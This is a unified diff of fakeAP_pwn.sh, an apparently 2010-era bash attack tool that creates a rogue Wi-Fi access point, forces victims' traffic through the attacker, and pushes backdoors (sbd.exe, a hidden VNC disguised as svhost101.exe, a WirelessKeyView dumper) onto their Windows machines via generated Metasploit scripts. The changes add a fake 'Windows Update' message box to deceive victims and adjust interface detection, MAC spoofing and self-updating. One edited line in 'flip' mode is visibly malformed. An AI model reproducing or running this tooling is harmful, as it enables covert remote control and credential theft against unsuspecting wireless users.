@@ -1,6 +1,6 @@
 #!/bin/bash
 #----------------------------------------------------------------------------------------------#
-#fakeAP_pwn.sh v0.3 (#120 2010-10-08)                                                          #
+#fakeAP_pwn.sh v0.3 (#122 2010-10-09)                                                          #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
 #---License------------------------------------------------------------------------------------#
 #  This program is free software: you can redistribute it and/or modify it under the terms     #
@@ -56,7 +56,6 @@ fakeMac="00:05:7c:9a:58:3f"
 extras="false"
 
 #---Variables----------------------------------------------------------------------------------#
-monitorInterface="mon0"
       mtuMonitor="1800"                     # *Some cards will not support changing this value*
            mtuAP="1400"                     # If you're having "timing out" problems, change this
      diagnostics="false"                    # Creates a output file displays exactly whats going on
@@ -68,7 +67,7 @@ monitorInterface="mon0"
      displayMore="false"                    # Gives more details on whats happening
            debug="false"                    # Doesn't delete files, shows more on screen etc
          logFile="fakeAP_pwn.log"           # Filename of output
-             svn="120"                      # SVN Number
+             svn="122"                      # SVN Number
          version="0.3 (#$svn)"              # Program version
 trap 'cleanUp interrupt' 2                  # Captures interrupt signal (Ctrl + C)
 
@@ -116,16 +115,11 @@ function cleanUp() { #cleanUp #mode
    if [ "$1" != "remove" ]; then
       display action "Restoring: Environment"
       if [ "$displayMore" == "true" ] ; then display action "Restoring: Programs" ; fi
+
       if [ "$1" != "clean" ] ; then
-         if [ "$apType" == "airbase-ng" ] ; then
-            command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
-            if [ "$command" == "$monitorInterface" ] ; then
-               sleep 1 # Sometimes it needs to catch up/wait
-               action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface"
-            fi
-         else
-            action "Monitor Mode (Stopping)" "airmon-ng stop mon.$apInterface"
-         fi
+         command=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1)
+         if [ "$command" ] && [ "$apType" == "airbase-ng" ] ; then action "Monitor Mode (Stopping)" "airmon-ng stop $command"
+         elif [ "$command" ] && [ "$apType" == "hostapd" ] ; then action "Monitor Mode (Stopping)" "airmon-ng stop mon.$apInterface" ; fi
          action "Stopping services" "/etc/init.d/squid stop ; /etc/init.d/apache2 stop ; /etc/init.d/dnsmasq stop"
          action "Starting services" "/etc/init.d/wicd start ; service network-manager start" # Backtrack & Ubuntu
       fi
@@ -350,11 +344,13 @@ function update() { #update
    if [ "$debug" == "true" ] ; then display diag "update~$@" ; fi
    display action "Checking for an update"
    if [ -e "/usr/bin/svn" ] ; then
-      command=$(svn info http://fakeap-pwn.googlecode.com/svn/ | grep "Revision:" | cut -c11-) # Last Changed Rev?
+      command=$(svn info http://fakeap-pwn.googlecode.com/svn/ | grep "Revision:" | cut -c11-)
       if [ "$command" != "$svn" ] ; then
          display info "Updating"
          svn export -q --force "http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh" "fakeAP_pwn.sh"
-         svn export -q --force "http://fakeap-pwn.googlecode.com/svn/trunk/www/" "$www/"
+         if [ -e "./www/" ] ; then svn export -q --force "http://fakeap-pwn.googlecode.com/svn/trunk/www/" "./www/" ; fi
+         if [ -e "$www/" ] ; then svn export -q --force "http://fakeap-pwn.googlecode.com/svn/trunk/www/" "$www/" ; fi
+         if [ ! -e "./www/" ] && [ ! -e "$www/" ] ; then display error "Couldn't update the \"www\" folder" ; fi
          display info "Updated to $command. (="
       else
          display info "You're using the latest version. (="
@@ -364,8 +360,11 @@ function update() { #update
       if [ "$command" != "$svn" ] ; then
          display info "Updating"
          wget -q -N "http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh"
-         wget -q -N -P "$www/" "http://fakeap-pwn.googlecode.com/svn/trunk/www/index.php"
-         wget -q -N -P "$www/" "http://fakeap-pwn.googlecode.com/svn/trunk/www/vnc.reg"
+         for items in "favicon.ico" "index.php" "Linux.jpg" "OSX.jpg" "style.css" "tick.png" "vnc.reg" "Windows.jpg" "your operating system.jpg" ; do
+            if [ -e "./www/" ] ; then wget -q -N -P "./www/" "http://fakeap-pwn.googlecode.com/svn/trunk/www/$items" ; fi
+            if [ -e "$www/" ] ; then wget -q -N -P "$www/" "http://fakeap-pwn.googlecode.com/svn/trunk/www/$items" ; fi
+         done
+         if [ ! -e "./www/" ] && [ ! -e "$www/" ] ; then display error "Couldn't update the \"www\" folder" ; fi
          display info "Updated! (="
       else
          display info "You're using the latest version. (="
@@ -440,13 +439,13 @@ if [ "$channel" -lt "0" ] || [ "$channel" -gt "13" ] ; then display error "chann
 if [ "$apType" != "airbase-ng" ] && [ "$apType" != "hostapd" ] ; then display error "apType ($apType) isn't correct" 1>&2 ; apType="airbase-ng" ; fi
 
 if [ "$mode" == "transparent" ] || [ "$mode" == "non" ] ; then
-   if [ "$payload" == "vnc" ] && [ ! -e "$www/sbd.exe" ] ; then display error "sbd.exe isn't in $www" 1>&2 ; cleanUp ; fi
-   if [ "$payload" == "wkv" ] && [ ! -e "$www/wkv-x86.exe" ] && [ ! -e "$www/wkv-x64.exe" ] ; then display error "wkv isn't in $www" 1>&2 ; cleanUp ; fi
-   if [ "$payload" == "vnc" ] && [ ! -e "$www/vnc.exe" ] && [ ! -e "$www/vnchooks.dll" ] && [ ! -e "$www/vnc.reg" ] ; then display error "vnc isn't in $www" 1>&2 ; cleanUp ; fi
-fi
-if ( [ "$mode" == "transparent" ] || [ "$mode" == "non" ] ) && [ "$payload" == "other" ] ; then
-   if [ -z "$backdoorPath" ] ; then display error "backdoorPath can't be blank" 1>&2 ; cleanUp ; fi
-   if [ ! -e "$backdoorPath" ] ; then display error "There isn't a backdoor at $backdoorPath" 1>&2 ; cleanUp ; fi
+   if [ "$payload" == "vnc" ] && [ ! -e "$www/sbd.exe" ] ; then display error "sbd.exe isn't in $www" 1>&2 ; cleanUp
+   elif [ "$payload" == "wkv" ] && [ ! -e "$www/wkv-x86.exe" ] && [ ! -e "$www/wkv-x64.exe" ] ; then display error "wkv isn't in $www" 1>&2 ; cleanUp
+   elif [ "$payload" == "vnc" ] && [ ! -e "$www/vnc.exe" ] && [ ! -e "$www/vnchooks.dll" ] && [ ! -e "$www/vnc.reg" ] ; then display error "vnc isn't in $www" 1>&2 ; cleanUp
+   elif [ "$payload" == "other" ] ; then
+      if [ -z "$backdoorPath" ] ; then display error "backdoorPath can't be blank" 1>&2 ; cleanUp
+      elif [ ! -e "$backdoorPath" ] ; then display error "There isn't a backdoor at $backdoorPath" 1>&2 ; cleanUp ; fi
+  fi
 fi
 if [ "$mtuMonitor" -lt "0" ] ; then display error "mtuMonitor ($mtuMonitor) isn't correct" 1>&2 ; mtuMonitor="1800" ; fi
 if [ "$mtuAP" -lt "0" ] ; then display error "mtuAP ($mtuAP) isn't correct" 1>&2 ; mtuAP="1400" ; fi
@@ -484,7 +483,7 @@ else
    apInterface="$wifiInterface"
    command=$(iw info | grep AP) # Doesn't check $wifiInterface, checks all! # phy1 if two WiFi # IW says its the output isn't stable....
    if [ ! $command ] ; then
-      display error "$wifiInterface MIGHT not suported by hostapd" # Isn't stable!
+      display error "$wifiInterface MIGHT not suported by hostapd" # Output isn't stable!
    #   display info "Switching apType: airbase-ng"
    #   apType="airbase-ng"
    #   apInterface="at0"
@@ -498,7 +497,6 @@ if [ "$diagnostics" == "true" ] ; then
    echo "-Settings------------------------------------------------------------------------------------
         interface=$interface
     wifiInterface=$wifiInterface
- monitorInterface=$monitorInterface
       apInterface=$apInterface
             essid=$essid
           channel=$channel
@@ -556,7 +554,6 @@ fi
 if [ "$verbose" != "0" ] || [ "$debug" == "true" ] ; then # if [ "$displayMore" == "true" ]
     display info "       interface=$interface
 \e[01;33m[i]\e[00m    wifiInterface=$wifiInterface
-\e[01;33m[i]\e[00m monitorInterface=$monitorInterface
 \e[01;33m[i]\e[00m      apInterface=$apInterface
 \e[01;33m[i]\e[00m            essid=$essid
 \e[01;33m[i]\e[00m          channel=$channel
@@ -841,36 +838,29 @@ fi
 
 #----------------------------------------------------------------------------------------------#
 if [ "$displayMore" == "true" ] ; then display action "Configuring: Wireless card" ; fi
-if [ "$apType" == "airbase-ng" ] ; then
-   command=$(ifconfig -a | grep "$monitorInterface" | awk '{print $1}')
-   if [ "$command" == "$monitorInterface" ] ; then
-      action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface"
-      sleep 1
-   fi
+monitorInterface=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1)
 
-   action "Monitor Mode (Starting)" "airmon-ng start $wifiInterface | tee /tmp/fakeAP_pwn.tmp"
-   command=$(cat /tmp/fakeAP_pwn.tmp | awk '/monitor mode enabled on/ {print $5}' | tr -d '\011' | sed 's/\(.*\)./\1/')
-   if [ "$monitorInterface" != "$command" ] && [ "$command" ] ; then
-      if [ "$displayMore" == "true" ] ; then display info "Configuring: Chaning monitorInterface to: $command" ; fi
-      monitorInterface="$command"
-   fi
-   ifconfig $monitorInterface mtu $mtuMonitor
+if [ -z "$monitorInterface" ] && [ "$apType" == "airbase-ng" ] ; then
+   action "Monitor Mode (Starting)" "airmon-ng start $wifiInterface"
+   monitorInterface=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1)
+fi
+
+if [ -z "$monitorInterface" ] ; then display error "Couldn't detect monitorInterface" 1>&2 ; cleanUp ;
+elif [ "$displayMore" == "true" ] ; then display info "monitorInterface=$monitorInterface" ; fi
+
+ifconfig $monitorInterface mtu $mtuMonitor
 
 #----------------------------------------------------------------------------------------------#
-   command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
-   if [ "$command" ] ; then # $interface is WiFi. Therefore two WiFi cards
-      command=$(iwlist $interface scan 2>/dev/null | grep "essid:")
+command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
+if [ "$command" ] ; then # $interface is WiFi. Therefore two WiFi cards
+   command=$(iwlist $interface scan 2>/dev/null | grep "essid:")
+   if [ -n "$command" ] && ( [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ) ; then   # Checking for a access point to test as we haven't created one yet
       if [ "$diagnostics" == "true" ] ; then echo -e "$command" >> $logFile ; fi
-      if [ ! -z "$command" ] ; then   # Checking for a access point to test as we haven't created one yet
-         if [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
-            display diag "Testing: Wireless Injection"
-            command=$(aireplay-ng --test $monitorInterface -i $monitorInterface)
-            if [ "$diagnostics" == "true" ] ; then echo -e "$command" >> $logFile ; fi
-            if [ -z "$(echo \"$command\" | grep 'Injection is working')" ] ; then display error "$monitorInterface doesn't support packet injecting" 1>&2
-            elif [ -z "$(echo \"$command\" | grep 'Found 0 APs')" ] ; then display error "Couldn't test packet injection" 1>&2 ;
-            fi
-         fi
-      fi
+      display diag "Testing: Wireless Injection"
+      command=$(aireplay-ng --test $monitorInterface -i $monitorInterface)
+      if [ "$diagnostics" == "true" ] ; then echo -e "$command" >> $logFile ; fi
+      if [ -z "$(echo \"$command\" | grep 'Injection is working')" ] ; then display error "$monitorInterface doesn't support packet injecting" 1>&2
+      elif [ -z "$(echo \"$command\" | grep 'Found 0 APs')" ] ; then display error "Couldn't test packet injection" 1>&2 ; fi
    fi
 fi
 
@@ -878,12 +868,12 @@ fi
 if [ "$macMode" != "false" ] ; then
    if [ "$displayMore" == "true" ] ; then display action "Configuring: MAC address" ; fi
    if [ "$apType" == "airbase-ng" ] ; then
-      command="ifconfig $monitorInterface down &&"
-      if [ "$macMode" == "random" ] ; then command="$command macchanger -A $monitorInterface &&" ; fi
-      if [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $monitorInterface &&" ; fi
+      command="ifconfig $monitorInterface down ;"
+      if [ "$macMode" == "random" ] ; then command="$command macchanger -A $monitorInterface ;" ; fi
+      if [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $monitorInterface ;" ; fi
       command="$command ifconfig $monitorInterface up"
    elif [ "$apType" == "hostapd" ] ; then
-      command="ifconfig $wifiInterface down &&"
+      command="ifconfig $wifiInterface down ;"
       if [ "$macMode" == "random" ] ; then command="$command macchanger -A $wifiInterface" ; fi
       if [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $wifiInterface" ; fi
       command="$command ifconfig $wifiInterface up"
@@ -972,7 +962,7 @@ log-facility=/tmp/fakeAP_pwn.dnsmasq" >> $path
 if [ "$verbose" == "2" ]  ; then echo "Created: $path" ; fi
 if [ "$debug" == "true" ] ; then cat "$path" ; fi
 if [ ! -e "$path" ] ; then display error "Couldn't create $path" 1>&2 ; cleanUp; fi
-cat $path > $path.non && echo "address=/#/$ourIP" >> $path.non
+#cat $path > $path.non && echo "address=/#/$ourIP" >> $path.non
 
 #----------------------------------------------------------------------------------------------#
 if [ "$mode" == "transparent" ] || [ "$mode" == "non" ] ; then
@@ -997,7 +987,8 @@ def doOSX
 end
 def doWindows(uac)
 	session.response_timeout=120
-	begin" >> $path
+	begin
+		execute(session,\"cmd.exe /C echo set args=WScript.Arguments > %TEMP%\\\msg.vbs && echo x=msgbox(args.item(0),args.item(1),args.item(2)) >> %TEMP%\\\msg.vbs && echo wscript.quit return >> %TEMP%\\\msg.vbs \", nil)" >> $path
    if [ "$payload" == "vnc" ] ; then echo "		print_status(\"   Stopping: winvnc.exe\")
 		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost101.exe /F\", nil, {'Hidden' => true})
 		sleep(1)
@@ -1084,6 +1075,9 @@ def doWindows(uac)
 		execute(session,\"cmd.exe /C #{exec}\", nil)" >> $path
    fi
    echo "		sleep(1)
+                print_status(\"Executing: Message Box\")
+		execute(session,\"cmd.exe /C cscript /nologo %TEMP%\\\msg.vbs \\\"Updated Installed\\\" 6 \\\"Windows Update\\\"\", nil)
+                delete(session, \"%SystemDrive%\\\msg.vbs\")
 		return
 
 	rescue ::Exception => e
@@ -1181,8 +1175,9 @@ print_status(\"Unlocking: fakeAP_pwn\")
 output = ::File.open(\"/tmp/fakeAP_pwn.lock\", \"a\")
 output.puts(\"fakeAP_pwn\")
 output.close
-sleep(1)" >> $path
-   echo "print_line(\"[*] Done!\")" >> $path
+sleep(1)
+
+print_line(\"[*] Done!\")" >> $path
    if [ "$verbose" == "2" ]  ; then echo "Created: $path" ; fi
    if [ "$debug" == "true" ] ; then cat "$path" ; fi
    if [ ! -e "$path" ] ; then display error "Couldn't create $path" 1>&2 ; cleanUp; fi
@@ -1473,7 +1468,7 @@ ipTables "clear"
 if [ "$mode" == "normal" ] ; then ipTables "transparent" "$apInterface" "$interface" "$gateway"
 elif [ "$mode" == "transparent" ] ; then ipTables "transparent" "$apInterface" "$interface" "$gateway" ; ipTables "force" "$apInterface"
 elif [ "$mode" == "non" ]  ; then ipTables "force" "$apInterface"
-elif [ "$mode" == "flip" ] ; then ipTables "squid" "$apInterface" "$interface" ; fi
+elif [ "$mode" == "flip" ] ; then ipTables ipTables "transparent" "$apInterface" "$interface" "$gateway" ; "squid" "$apInterface" "$interface" ; fi
 
 #----------------------------------------------------------------------------------------------#
 if [ "$displayMore" == "true" ] ; then display action "Configuring: Permissions" ; fi
@@ -1671,3 +1666,5 @@ cleanUp clean
 # Add: VNC "spy" option
 # Use: vnc.rb in metasploit?
 # Use: Re look at index.php - dont use http://$ourIP/[Filename]
+
+# Doesn't do anythign different if they click "no" - msgbox metasploit
